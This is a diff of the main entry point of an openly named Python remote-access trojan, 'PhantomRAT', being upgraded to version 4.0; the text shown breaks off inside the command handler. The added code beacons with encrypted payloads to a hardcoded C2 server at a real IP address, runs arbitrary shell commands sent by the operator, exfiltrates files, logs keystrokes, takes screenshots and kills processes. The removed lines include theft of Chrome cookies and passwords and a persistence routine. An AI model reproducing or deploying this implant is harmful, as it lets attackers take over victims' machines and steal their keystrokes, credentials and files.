@@ -1,7 +1,9 @@
-
-# PhantomRAT Malware Main Entry Point
-# Enhanced for performance and stealth
-# Updated for PhantomRAT C2 v3.0
+#!/usr/bin/env python3
+"""
+PhantomRAT Malware Main Entry Point v4.0
+Enhanced for performance, stealth, and compatibility with C2 v4.0
+Updated with new command handlers and improved beacon system
+"""
 
 import sys
 import os
@@ -13,79 +15,113 @@ import socket
 import logging
 import base64
 import hashlib
+import uuid
+import platform
+import psutil
 from datetime import datetime
+import subprocess
 
 # Configure minimal logging for stealth
 logging.getLogger().setLevel(logging.ERROR)
 
-# ==================== C2 CONFIGURATION ====================
+# ==================== C2 CONFIGURATION v4.0 ====================
 C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
+BEACON_ENDPOINT = "/phantom/beacon"
+EXFIL_ENDPOINT = "/phantom/exfil"
 IMPLANT_ID = None
-ENCRYPTION_KEY = None
+SESSION_ID = str(uuid.uuid4())[:8]  # New session ID for each run
 
-# ==================== LOAD ENCRYPTION KEY ====================
-def load_encryption_key():
-    """Load encryption key from profile"""
-    global ENCRYPTION_KEY
-    
+# User-Agent from malleable profile
+try:
+    with open('malleable_profile.json', 'r') as f:
+        profile = json.load(f)
+        USER_AGENT = profile.get('security', {}).get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+except:
+    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+
+# ==================== ENCRYPTION COMPATIBLE WITH C2 v4.0 ====================
+def get_encryption_key():
+    """Get encryption key compatible with C2 v4.0"""
     try:
         with open('malleable_profile.json', 'r') as f:
             profile = json.load(f)
-            ENCRYPTION_KEY = profile.get('encryption', {}).get('key')
-            if not ENCRYPTION_KEY:
-                # Generate a key based on system info
-                host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:32]
-                ENCRYPTION_KEY = host_hash
-    except FileNotFoundError:
-        # Generate default key
-        ENCRYPTION_KEY = hashlib.md5(socket.gethostname().encode()).hexdigest()[:32]
+            key = profile.get('encryption', {}).get('key')
+            if key:
+                return key.encode()
+    except:
+        pass
     
-    # Pad to 32 bytes if needed
-    if len(ENCRYPTION_KEY) < 32:
-        ENCRYPTION_KEY = ENCRYPTION_KEY.ljust(32, '0')[:32]
-    
-    return ENCRYPTION_KEY
+    # Generate from system info (compatible with C2)
+    system_hash = hashlib.sha256(
+        f"{socket.gethostname()}{platform.machine()}{os.getpid()}".encode()
+    ).digest()
+    return system_hash[:32]  # Ensure 32 bytes
 
-# Simple encryption class compatible with C2
+ENCRYPTION_KEY = get_encryption_key()
+
+# Encryption class compatible with C2 v4.0
 class PhantomEncryption:
     def __init__(self, key):
         from cryptography.fernet import Fernet
         import base64
-        # Ensure key is 32 bytes
+        
         if isinstance(key, str):
             key = key.encode()
-        key = key.ljust(32)[:32]
-        self.fernet = Fernet(base64.urlsafe_b64encode(key))
+        
+        # Ensure key is 32 bytes
+        if len(key) < 32:
+            key = key.ljust(32, b'0')[:32]
+        elif len(key) > 32:
+            key = key[:32]
+        
+        # Generate Fernet key (must be 32 url-safe base64-encoded bytes)
+        fernet_key = base64.urlsafe_b64encode(key)
+        self.fernet = Fernet(fernet_key)
     
     def encrypt(self, data):
-        """Encrypt data"""
+        """Encrypt data for C2 v4.0"""
         if isinstance(data, dict):
-            data = json.dumps(data)
+            data = json.dumps(data, separators=(',', ':'))  # Compact JSON
         if isinstance(data, str):
-            data = data.encode()
-        return self.fernet.encrypt(data).decode()
+            data = data.encode('utf-8')
+        
+        try:
+            encrypted = self.fernet.encrypt(data)
+            return encrypted.decode('utf-8')
+        except Exception as e:
+            print(f"[!] Encryption error: {e}")
+            return base64.b64encode(data).decode('utf-8')  # Fallback
     
     def decrypt(self, encrypted_data):
-        """Decrypt data"""
+        """Decrypt data from C2 v4.0"""
         try:
-            decrypted = self.fernet.decrypt(encrypted_data.encode()).decode()
+            if isinstance(encrypted_data, str):
+                encrypted_data = encrypted_data.encode('utf-8')
+            
+            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
+            
+            # Try to parse as JSON
             try:
                 return json.loads(decrypted)
             except:
                 return decrypted
         except Exception as e:
             print(f"[!] Decryption error: {e}")
-            return None
+            # Try base64 fallback
+            try:
+                return base64.b64decode(encrypted_data).decode('utf-8')
+            except:
+                return None
 
 # Initialize encryption
-load_encryption_key()
 encryption = PhantomEncryption(ENCRYPTION_KEY)
 
 # ==================== MODULE IMPORTS WITH ERROR HANDLING ====================
 GUI_MODULES_AVAILABLE = False
 keylogger = None
 
-print("[*] PhantomRAT Implant Initializing...")
+print(f"[*] PhantomRAT v4.0 Implant Initializing...")
+print(f"[*] Session ID: {SESSION_ID}")
 
 # Try to import GUI modules
 try:
@@ -109,609 +145,961 @@ except ImportError as e:
     print(f"[-] Enhanced system info not available: {e}")
     SYSINFO_AVAILABLE = False
 
-# Try to import other modules
-def safe_import(module_name, class_name=None):
+# Dynamic module loader
+MODULES = {}
+def load_module(module_name, class_name=None):
+    """Dynamically load a module with error handling"""
     try:
-        module = __import__(module_name)
+        if module_name in sys.modules:
+            module = sys.modules[module_name]
+        else:
+            module = __import__(module_name)
+        
         if class_name:
             return getattr(module, class_name)
         return module
     except ImportError:
+        MODULES[module_name] = None
         return None
 
-# Dynamically load modules
-phantomrat_process = safe_import('phantomrat_process')
-phantomrat_privilege = safe_import('phantomrat_privilege')
-phantomrat_fileops = safe_import('phantomrat_fileops')
-phantomrat_browser = safe_import('phantomrat_browser')
-phantomrat_persistence = safe_import('phantomrat_persistence')
-phantomrat_survival = safe_import('phantomrat_survival')
+# Load all available modules
+MODULES['process'] = load_module('phantomrat_process')
+MODULES['privilege'] = load_module('phantomrat_privilege')
+MODULES['fileops'] = load_module('phantomrat_fileops')
+MODULES['browser'] = load_module('phantomrat_browser')
+MODULES['persistence'] = load_module('phantomrat_persistence')
+MODULES['survival'] = load_module('phantomrat_survival')
+MODULES['network'] = load_module('phantomrat_network')
 
-# ==================== BASIC SYSTEM INFO (FALLBACK) ====================
-def get_basic_system_info():
-    """Fallback system info if enhanced module is not available"""
-    import platform
-    import psutil
-    
-    info = {
-        'timestamp': datetime.now().isoformat(),
-        'basic': {
-            'hostname': socket.gethostname(),
-            'os': platform.system(),
-            'os_version': platform.version(),
-            'architecture': platform.machine(),
-            'processor': platform.processor(),
-            'python_version': platform.python_version()
-        },
-        'hardware': {
-            'cpu_cores': psutil.cpu_count(logical=True),
-            'cpu_physical_cores': psutil.cpu_count(logical=False),
-            'memory_total': psutil.virtual_memory().total,
-            'memory_available': psutil.virtual_memory().available,
-            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat()
-        },
-        'user': {
-            'username': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
-            'home_dir': os.path.expanduser('~'),
-            'current_dir': os.getcwd()
-        },
-        'network': {
-            'hostname': socket.gethostname(),
-            'ip': socket.gethostbyname(socket.gethostname())
-        }
-    }
-    
-    # Try to get disk info
+print(f"[+] Loaded {sum(1 for m in MODULES.values() if m)}/{len(MODULES)} modules")
+
+# ==================== ENHANCED SYSTEM INFO ====================
+def get_comprehensive_system_info():
+    """Get comprehensive system information for C2 dashboard"""
     try:
-        disk_info = []
-        for partition in psutil.disk_partitions():
-            try:
+        # Network interfaces
+        interfaces = []
+        try:
+            for interface, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        interfaces.append({
+                            'interface': interface,
+                            'ip': addr.address,
+                            'netmask': addr.netmask
+                        })
+        except:
+            pass
+        
+        # Running processes (top 5 by CPU)
+        processes = []
+        try:
+            for proc in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), 
+                              key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:5]:
+                processes.append({
+                    'pid': proc.info['pid'],
+                    'name': proc.info['name'],
+                    'cpu': proc.info['cpu_percent']
+                })
+        except:
+            pass
+        
+        # Disk usage
+        disks = []
+        try:
+            for partition in psutil.disk_partitions():
                 usage = psutil.disk_usage(partition.mountpoint)
-                disk_info.append({
+                disks.append({
                     'device': partition.device,
                     'mountpoint': partition.mountpoint,
-                    'total': usage.total,
-                    'used': usage.used,
-                    'free': usage.free
+                    'total_gb': round(usage.total / (1024**3), 2),
+                    'used_gb': round(usage.used / (1024**3), 2),
+                    'free_gb': round(usage.free / (1024**3), 2),
+                    'percent': usage.percent
                 })
-            except:
-                continue
-        info['hardware']['disks'] = disk_info
-    except:
-        pass
-    
-    return info
-
-def get_system_info():
-    """Get system info using enhanced module or fallback"""
-    if SYSINFO_AVAILABLE:
+        except:
+            pass
+        
+        info = {
+            'id': IMPLANT_ID or 'UNREGISTERED',
+            'session_id': SESSION_ID,
+            'os': platform.system(),
+            'os_version': platform.version(),
+            'hostname': socket.gethostname(),
+            'ip': socket.gethostbyname(socket.gethostname()),
+            'username': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
+            'architecture': platform.machine(),
+            'cpu_count': psutil.cpu_count(logical=True),
+            'cpu_physical_count': psutil.cpu_count(logical=False),
+            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
+            'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
+            'memory_percent': psutil.virtual_memory().percent,
+            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
+            'uptime_days': round((time.time() - psutil.boot_time()) / 86400, 2),
+            'python_version': platform.python_version(),
+            'current_dir': os.getcwd(),
+            'interfaces': interfaces,
+            'top_processes': processes,
+            'disks': disks,
+            'timestamp': datetime.now().isoformat(),
+            'has_gui': GUI_MODULES_AVAILABLE,
+            'has_enhanced_info': SYSINFO_AVAILABLE,
+            'last_seen': time.time()
+        }
+        
+        # Add GPU info if available
         try:
-            return system_info.get_comprehensive_info()
-        except Exception as e:
-            print(f"[!] Enhanced system info failed: {e}")
-            return get_basic_system_info()
-    else:
+            import GPUtil
+            gpus = GPUtil.getGPUs()
+            if gpus:
+                info['gpu'] = {
+                    'name': gpus[0].name,
+                    'load': gpus[0].load,
+                    'memory_total': gpus[0].memoryTotal,
+                    'memory_free': gpus[0].memoryFree
+                }
+        except:
+            pass
+        
+        return info
+    except Exception as e:
+        print(f"[!] Error getting system info: {e}")
         return get_basic_system_info()
 
-# ==================== C2 COMMUNICATION ====================
-def send_to_c2(endpoint, data, method='POST'):
-    """Send encrypted data to C2 server"""
+def get_basic_system_info():
+    """Fallback basic system info"""
+    return {
+        'id': IMPLANT_ID or 'UNREGISTERED',
+        'hostname': socket.gethostname(),
+        'os': platform.system(),
+        'ip': socket.gethostbyname(socket.gethostname()),
+        'timestamp': datetime.now().isoformat(),
+        'last_seen': time.time()
+    }
+
+# ==================== C2 COMMUNICATION v4.0 ====================
+def send_to_c2(endpoint, data, method='POST', retry=3):
+    """Send encrypted data to C2 server v4.0"""
     import requests
     
-    # Generate implant ID if not set
     global IMPLANT_ID
+    
+    # Generate implant ID if not set
     if not IMPLANT_ID:
-        host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
-        IMPLANT_ID = f"GHOST-{host_hash.upper()}"
+        host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
+        IMPLANT_ID = f"PHANTOM-{host_hash.upper()}"
     
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'X-Phantom': 'Data',
-        'X-Implant-ID': IMPLANT_ID
+        'User-Agent': USER_AGENT,
+        'X-Phantom-ID': IMPLANT_ID,
+        'X-Phantom-Session': SESSION_ID,
+        'X-Phantom-Version': '4.0',
+        'Content-Type': 'application/octet-stream'
     }
     
-    try:
-        # Prepare payload
-        payload = {
-            'implant_id': IMPLANT_ID,
-            'data': data,
-            'timestamp': time.time()
-        }
-        
-        encrypted_data = encryption.encrypt(payload)
-        
-        if method.upper() == 'POST':
-            response = requests.post(
-                f"{C2_SERVER}{endpoint}",
-                data=encrypted_data,
-                headers=headers,
-                timeout=15
-            )
-        else:
-            # For GET requests, include data in headers
-            headers['X-Payload'] = encrypted_data[:100]  # First 100 chars
-            response = requests.get(
-                f"{C2_SERVER}{endpoint}",
-                headers=headers,
-                timeout=15
-            )
-        
-        if response.status_code == 200:
-            # Try to decrypt response
-            try:
-                decrypted = encryption.decrypt(response.text)
-                return decrypted
-            except:
-                return {'status': 'received', 'raw': response.text}
-        
-        return {'error': f'HTTP {response.status_code}', 'status': 'failed'}
-        
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Network error: {e}")
-        return {'error': str(e), 'status': 'network_error'}
-    except Exception as e:
-        print(f"[!] C2 communication error: {e}")
-        return {'error': str(e), 'status': 'error'}
+    for attempt in range(retry):
+        try:
+            # Prepare payload
+            payload = {
+                'id': IMPLANT_ID,
+                'data': data,
+                'timestamp': time.time(),
+                'session': SESSION_ID,
+                'attempt': attempt + 1
+            }
+            
+            encrypted_data = encryption.encrypt(payload)
+            
+            url = f"{C2_SERVER}{endpoint}"
+            
+            if method.upper() == 'POST':
+                response = requests.post(
+                    url,
+                    data=encrypted_data,
+                    headers=headers,
+                    timeout=20,
+                    verify=False  # For testing, remove in production
+                )
+            else:
+                response = requests.get(
+                    url,
+                    headers=headers,
+                    timeout=20,
+                    verify=False
+                )
+            
+            if response.status_code == 200:
+                # Try to decrypt response for beacon endpoint
+                if endpoint == BEACON_ENDPOINT:
+                    try:
+                        decrypted = encryption.decrypt(response.content)
+                        return decrypted
+                    except:
+                        # If decryption fails, try to parse as plain JSON
+                        try:
+                            return json.loads(response.text)
+                        except:
+                            return {'tasks': []}
+                return {'status': 'success', 'code': response.status_code}
+            elif response.status_code in [404, 403]:
+                print(f"[!] C2 endpoint not found or forbidden: {endpoint}")
+                return {'status': 'error', 'code': response.status_code}
+            else:
+                print(f"[!] C2 responded with code: {response.status_code}")
+                if attempt < retry - 1:
+                    time.sleep(2 ** attempt)  # Exponential backoff
+                
+        except requests.exceptions.ConnectionError:
+            print(f"[!] Connection failed (attempt {attempt + 1}/{retry})")
+            if attempt < retry - 1:
+                time.sleep(3 * (attempt + 1))
+        except requests.exceptions.Timeout:
+            print(f"[!] Request timeout (attempt {attempt + 1}/{retry})")
+            if attempt < retry - 1:
+                time.sleep(2 * (attempt + 1))
+        except Exception as e:
+            print(f"[!] Request error: {e}")
+            if attempt < retry - 1:
+                time.sleep(2)
+    
+    return {'status': 'failed', 'error': 'All retries exhausted'}
 
-def exfil_data(data):
-    """Exfiltrate data to C2"""
-    return send_to_c2('/phantom/exfil', data)
-
-def beacon():
-    """Check in with C2 and get tasks"""
-    result = send_to_c2('/phantom/beacon', {'type': 'beacon'}, 'GET')
+def beacon_checkin():
+    """Check in with C2 v4.0 and get tasks"""
+    system_info = get_comprehensive_system_info()
     
-    if result and 'tasks' in result:
-        return result['tasks']
-    elif result and 'status' in result and result['status'] == 'ok':
-        return result.get('tasks', [])
-    return []
-
-def register_implant():
-    """Register with C2 server"""
-    global IMPLANT_ID
-    
-    # Generate unique implant ID
-    host_hash = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
-    IMPLANT_ID = f"GHOST-{host_hash.upper()}"
-    
-    print(f"[*] Generated implant ID: {IMPLANT_ID}")
-    
-    registration_data = {
-        'type': 'register',
-        'implant_id': IMPLANT_ID,
-        'system_info': get_system_info(),
+    beacon_data = {
+        'id': IMPLANT_ID,
+        'os': system_info.get('os'),
+        'hostname': system_info.get('hostname'),
+        'ip': system_info.get('ip'),
+        'status': 'active',
         'capabilities': {
             'gui': GUI_MODULES_AVAILABLE,
-            'enhanced_info': SYSINFO_AVAILABLE,
             'keylogger': GUI_MODULES_AVAILABLE,
             'screenshot': GUI_MODULES_AVAILABLE,
-            'timestamp': time.time()
-        }
+            'webcam': GUI_MODULES_AVAILABLE,
+            'audio': GUI_MODULES_AVAILABLE
+        },
+        'timestamp': time.time()
     }
     
-    result = exfil_data(registration_data)
+    result = send_to_c2(BEACON_ENDPOINT, beacon_data)
     
-    if result and 'status' in result:
-        print(f"[+] Registered successfully as {IMPLANT_ID}")
-        return True
-    else:
-        print(f"[-] Registration failed for {IMPLANT_ID}")
-        print(f"    Response: {result}")
-        return False
+    if result and isinstance(result, dict):
+        if 'tasks' in result:
+            return result['tasks']
+        elif 'status' in result and result['status'] == 'success':
+            return []
+    
+    return []
 
-# ==================== NETWORK FUNCTIONS ====================
-def map_network(subnet=None):
-    """Simple network scanning"""
+def exfil_data(data, task_id=None):
+    """Exfiltrate data to C2 v4.0"""
+    exfil_payload = {
+        'id': IMPLANT_ID,
+        'data': data,
+        'timestamp': time.time()
+    }
+    
+    if task_id:
+        exfil_payload['task_id'] = task_id
+    
+    return send_to_c2(EXFIL_ENDPOINT, exfil_payload)
+
+# ==================== ENHANCED COMMAND HANDLERS ====================
+def execute_shell_command(cmd, timeout=30):
+    """Execute shell command with timeout"""
     try:
-        import ipaddress
-        import subprocess
-        import platform
+        # Parse command and arguments
+        if isinstance(cmd, str):
+            import shlex
+            args = shlex.split(cmd)
+        else:
+            args = cmd
         
-        if not subnet:
-            # Get local network
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            
-            # Create /24 subnet from local IP
-            subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
+        # Execute with timeout
+        process = subprocess.run(
+            args,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            shell=False if isinstance(cmd, list) else True
+        )
         
-        network = ipaddress.ip_network(subnet, strict=False)
-        results = []
+        return {
+            'success': process.returncode == 0,
+            'returncode': process.returncode,
+            'stdout': process.stdout,
+            'stderr': process.stderr,
+            'command': cmd
+        }
+    except subprocess.TimeoutExpired:
+        return {
+            'success': False,
+            'error': f'Command timed out after {timeout} seconds',
+            'command': cmd
+        }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e),
+            'command': cmd
+        }
+
+def take_screenshot():
+    """Take screenshot if GUI modules available"""
+    if not GUI_MODULES_AVAILABLE:
+        return {'error': 'GUI modules not available'}
+    
+    try:
+        screenshot_data = capture_screen()
+        if screenshot_data:
+            # For transmission, encode as base64
+            screenshot_b64 = base64.b64encode(screenshot_data).decode('utf-8')
+            return {
+                'success': True,
+                'size': len(screenshot_data),
+                'format': 'png',
+                'preview': screenshot_b64[:100] + '...' if len(screenshot_b64) > 100 else screenshot_b64
+            }
+        return {'error': 'Failed to capture screenshot'}
+    except Exception as e:
+        return {'error': str(e)}
+
+def start_keylogger():
+    """Start keylogging"""
+    global keylogger
+    if not GUI_MODULES_AVAILABLE:
+        return {'error': 'GUI modules not available'}
+    
+    try:
+        if keylogger is None:
+            keylogger = Keylogger()
+        keylogger.start()
+        return {'success': True, 'message': 'Keylogger started'}
+    except Exception as e:
+        return {'error': str(e)}
+
+def stop_keylogger():
+    """Stop keylogging and get logs"""
+    global keylogger
+    if keylogger is None:
+        return {'error': 'Keylogger not running'}
+    
+    try:
+        logs = keylogger.stop()
+        return {
+            'success': True,
+            'logs': logs[-5000:],  # Last 5000 characters
+            'total_size': len(logs)
+        }
+    except Exception as e:
+        return {'error': str(e)}
+
+def list_files(directory='.', max_files=100):
+    """List files in directory"""
+    try:
+        files = []
+        total_size = 0
         
-        # Quick ping scan for first 5 hosts
-        for ip in list(network.hosts())[:5]:
+        for item in os.listdir(directory):
+            item_path = os.path.join(directory, item)
             try:
-                param = '-n' if platform.system().lower() == 'windows' else '-c'
-                command = ['ping', param, '1', '-W', '1', str(ip)]
-                result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
+                stat = os.stat(item_path)
+                files.append({
+                    'name': item,
+                    'size': stat.st_size,
+                    'modified': stat.st_mtime,
+                    'is_dir': os.path.isdir(item_path)
+                })
+                total_size += stat.st_size
                 
-                if result.returncode == 0:
-                    results.append(str(ip))
+                if len(files) >= max_files:
+                    break
             except:
                 continue
         
-        return {'subnet': subnet, 'alive_hosts': results, 'total_scanned': 5}
+        return {
+            'success': True,
+            'directory': directory,
+            'files': files,
+            'count': len(files),
+            'total_size': total_size
+        }
     except Exception as e:
-        return {'error': str(e), 'subnet': subnet or 'unknown'}
+        return {'error': str(e)}
 
-# ==================== COMMAND HANDLING ====================
-def handle_command(task):
-    """Handle C2 commands with error handling"""
+def download_file(filepath, chunk_size=8192):
+    """Download file in chunks for transmission"""
+    if not os.path.exists(filepath):
+        return {'error': 'File not found'}
+    
+    try:
+        file_size = os.path.getsize(filepath)
+        
+        # For small files, read entire content
+        if file_size <= 1024 * 1024:  # 1MB limit
+            with open(filepath, 'rb') as f:
+                content = f.read()
+            
+            return {
+                'success': True,
+                'filename': os.path.basename(filepath),
+                'size': file_size,
+                'content': base64.b64encode(content).decode('utf-8')
+            }
+        else:
+            # For large files, send metadata only
+            return {
+                'success': False,
+                'error': f'File too large ({file_size} bytes). Use chunked download.',
+                'filename': os.path.basename(filepath),
+                'size': file_size
+            }
+    except Exception as e:
+        return {'error': str(e)}
+
+def handle_command_v4(task):
+    """Handle C2 v4.0 commands with improved error handling"""
     if not task or 'command' not in task:
-        return {'error': 'No command specified', 'success': False}
+        return {'error': 'Invalid task format', 'success': False}
     
     cmd = task['command']
     args = task.get('arguments', '')
     task_id = task.get('id')
     
-    print(f"[*] Executing command: {cmd}")
+    print(f"[*] Executing: {cmd} {args if args else ''}")
     
     result = {
         'command': cmd,
         'task_id': task_id,
+        'implant_id': IMPLANT_ID,
+        'session_id': SESSION_ID,
+        'timestamp': time.time(),
         'success': False,
-        'output': '',
-        'timestamp': time.time()
+        'output': None
     }
     
     try:
+        # ========== SYSTEM COMMANDS ==========
         if cmd == 'sysinfo':
-            if SYSINFO_AVAILABLE:
-                # Get comprehensive system info
-                info = system_info.get_comprehensive_info()
-                # Limit size for transmission
-                info_str = json.dumps(info)
-                if len(info_str) > 10000:  # If too large, send summary
-                    summary = {
-                        'timestamp': info.get('timestamp'),
-                        'hostname': info.get('basic_info', {}).get('hostname'),
-                        'os': info.get('basic_info', {}).get('operating_system'),
-                        'cpu_cores': info.get('hardware_info', {}).get('cpu', {}).get('logical_cores'),
-                        'memory_total': info.get('hardware_info', {}).get('memory', {}).get('virtual', {}).get('total'),
-                        'info_type': 'comprehensive',
-                        'size': len(info_str)
-                    }
-                    result['output'] = summary
-                else:
-                    result['output'] = info
-            else:
-                # Use basic system info
-                result['output'] = get_basic_system_info()
-            
+            result['output'] = get_comprehensive_system_info()
             result['success'] = True
-            
-        elif cmd == 'sysinfo_basic':
-            # Always use basic info (smaller)
-            result['output'] = get_basic_system_info()
-            result['success'] = True
-            
-        elif cmd == 'network_scan':
-            scan_result = map_network(args if args else None)
-            result['output'] = scan_result
-            result['success'] = True
-            
-        elif cmd == 'list_files' and phantomrat_fileops:
-            path = args if args else '.'
-            files = phantomrat_fileops.list_files(path)
-            result['output'] = {'path': path, 'files': files[:50]}  # Limit to 50 files
-            result['success'] = True
-            
-        elif cmd == 'download' and phantomrat_fileops:
-            if args:
-                # Limit file size for download
-                if os.path.exists(args) and os.path.getsize(args) < 1024 * 1024:  # 1MB limit
-                    data = phantomrat_fileops.download_file(args)
-                    if data:
-                        result['output'] = {
-                            'file': args,
-                            'size': len(data),
-                            'data_preview': data[:500]  # First 500 chars
-                        }
-                        result['success'] = True
-                    else:
-                        result['output'] = 'File not found or error reading'
-                else:
-                    result['output'] = 'File too large or does not exist'
-            else:
-                result['output'] = 'No file specified'
-                
-        elif cmd == 'execute':
-            import subprocess
-            try:
-                process = subprocess.Popen(
-                    args if isinstance(args, str) else ' '.join(args),
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    shell=True,
-                    text=True
-                )
-                stdout, stderr = process.communicate(timeout=30)
-                result['output'] = {
-                    'stdout': stdout[:1000],  # Limit output
-                    'stderr': stderr[:1000],
-                    'returncode': process.returncode
-                }
-                result['success'] = process.returncode == 0
-            except subprocess.TimeoutExpired:
-                result['output'] = 'Command timed out after 30 seconds'
-                result['success'] = False
-                
-        elif cmd == 'list_processes' and phantomrat_process:
-            processes = phantomrat_process.list_processes()
-            result['output'] = processes[:20]  # First 20 processes
-            result['success'] = True
-            
-        elif cmd == 'kill_process' and phantomrat_process:
-            if args:
-                try:
-                    pid = int(args)
-                    success = phantomrat_process.kill_process(pid)
-                    result['output'] = f'Process {pid} killed: {success}'
-                    result['success'] = success
-                except ValueError:
-                    result['output'] = 'Invalid PID format'
-            else:
-                result['output'] = 'No PID specified'
-                
-        elif cmd == 'browser_data' and phantomrat_browser:
-            try:
-                cookies = phantomrat_browser.exfil_chrome_cookies()
-                passwords = phantomrat_browser.exfil_chrome_passwords()
-                result['output'] = {
-                    'cookies_count': len(cookies) if cookies else 0,
-                    'passwords_count': len(passwords) if passwords else 0,
-                    'cookies_sample': cookies[:5] if cookies else [],
-                    'passwords_sample': passwords[:5] if passwords else []
-                }
-                result['success'] = True
-            except Exception as e:
-                result['output'] = f'Browser data error: {e}'
-                
-        elif cmd == 'persist' and phantomrat_persistence:
-            success = phantomrat_persistence.add_persistence()
-            result['output'] = f'Persistence added: {success}'
-            result['success'] = success
-            
-        elif cmd == 'screenshot' and GUI_MODULES_AVAILABLE:
-            try:
-                screenshot_data = capture_screen()
-                if screenshot_data:
-                    # For now, just report success
-                    result['output'] = f'Screenshot captured ({len(screenshot_data)} bytes)'
-                    result['success'] = True
-                else:
-                    result['output'] = 'Screenshot capture failed'
-            except Exception as e:
-                result['output'] = f'Screenshot error: {e}'
-                
-        elif cmd == 'keylog_start' and GUI_MODULES_AVAILABLE:
-            global keylogger
-            if keylogger is None:
-                keylogger = Keylogger()
-            keylogger.start_logging()
-            result['output'] = 'Keylogger started'
-            result['success'] = True
-            
-        elif cmd == 'keylog_stop' and GUI_MODULES_AVAILABLE and keylogger:
-            logs = keylogger.stop_logging()
-            result['output'] = f'Keylogger stopped. Log size: {len(logs) if logs else 0} chars'
-            result['success'] = True
-            
-        elif cmd == 'keylog_get' and GUI_MODULES_AVAILABLE and keylogger:
-            logs = keylogger.get_log()
-            result['output'] = logs[-1000:] if logs else 'No logs available'
-            result['success'] = logs is not None
-            
-        elif cmd == 'self_destruct':
-            # Clean up and exit
-            result['output'] = 'Self-destruct initiated. Goodbye.'
-            result['success'] = True
-            threading.Thread(target=cleanup_and_exit).start()
             
         elif cmd == 'ping':
-            result['output'] = 'pong'
+            result['output'] = {
+                'message': 'pong',
+                'implant_id': IMPLANT_ID,
+                'session_id': SESSION_ID,
+                'time': time.time()
+            }
             result['success'] = True
             
         elif cmd == 'get_id':
-            result['output'] = IMPLANT_ID
+            result['output'] = {
+                'implant_id': IMPLANT_ID,
+                'session_id': SESSION_ID,
+                'hostname': socket.gethostname()
+            }
             result['success'] = True
             
+        # ========== SHELL COMMANDS ==========
+        elif cmd == 'shell':
+            shell_result = execute_shell_command(args, timeout=60)
+            result['output'] = shell_result
+            result['success'] = shell_result.get('success', False)
+            
+        elif cmd == 'execute':
+            result['output'] = execute_shell_command(args, timeout=30)
+            result['success'] = result['output'].get('success', False)
+            
+        # ========== FILE OPERATIONS ==========
+        elif cmd == 'ls' or cmd == 'list_files':
+            directory = args if args else '.'
+            result['output'] = list_files(directory)
+            result['success'] = result['output'].get('success', False)
+            
+        elif cmd == 'download':
+            if args:
+                result['output'] = download_file(args)
+                result['success'] = result['output'].get('success', False)
+            else:
+                result['output'] = {'error': 'No file specified'}
+                
+        elif cmd == 'cd':
+            if args:
+                try:
+                    os.chdir(args)
+                    result['output'] = {
+                        'success': True,
+                        'new_dir': os.getcwd()
+                    }
+                    result['success'] = True
+                except Exception as e:
+                    result['output'] = {'error': str(e)}
+            else:
+                result['output'] = {'error': 'No directory specified'}
+                
+        # ========== GUI COMMANDS ==========
+        elif cmd == 'screenshot':
+            if GUI_MODULES_AVAILABLE:
+                result['output'] = take_screenshot()
+                result['success'] = result['output'].get('success', False)
+            else:
+                result['output'] = {'error': 'GUI modules not available'}
+                
+        elif cmd == 'keylog_start':
+            result['output'] = start_keylogger()
+            result['success'] = result['output'].get('success', False)
+            
+        elif cmd == 'keylog_stop':
+            result['output'] = stop_keylogger()
+            result['success'] = result['output'].get('success', False)
+            
+        elif cmd == 'keylog_get':
+            if keylogger:
+                logs = keylogger.get_logs()
+                result['output'] = {
+                    'success': True,
+                    'logs': logs[-2000:] if logs else '',
+                    'size': len(logs) if logs else 0
+                }
+                result['success'] = True
+            else:
+                result['output'] = {'error': 'Keylogger not running'}
+                
+        # ========== PROCESS COMMANDS ==========
+        elif cmd == 'ps' or cmd == 'list_processes':
+            processes = []
+            try:
+                for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
+                    try:
+                        processes.append(proc.info)
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        continue
+                result['output'] = {
+                    'success': True,
+                    'processes': processes[:50]  # Limit to 50
+                }
+                result['success'] = True
+            except Exception as e:
+                result['output'] = {'error': str(e)}
+                
+        elif cmd == 'kill':
+            if args:
+                try:
+                    pid = int(args)
+                    import signal
+                    os.kill(pid, signal.SIGTERM)
+                    result['output'] = {'success': True, 'pid': pid}
+                    result['success'] = True
+                except Exception as e:
+                    result['output'] = {'error': str(e)}
+            else:
+                result['output'] = {'error': 'No PID specified'}
+                
+        # ========== NETWORK COMMANDS ==========
+        elif cmd == 'ifconfig' or cmd == 'ipconfig':
+            interfaces = []
+            try:
+                for interface, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == socket.AF_INET:
+                            interfaces.append({
+                                'interface': interface,
+                                'ip': addr.address,
+                                'netmask': addr.netmask
+                            })
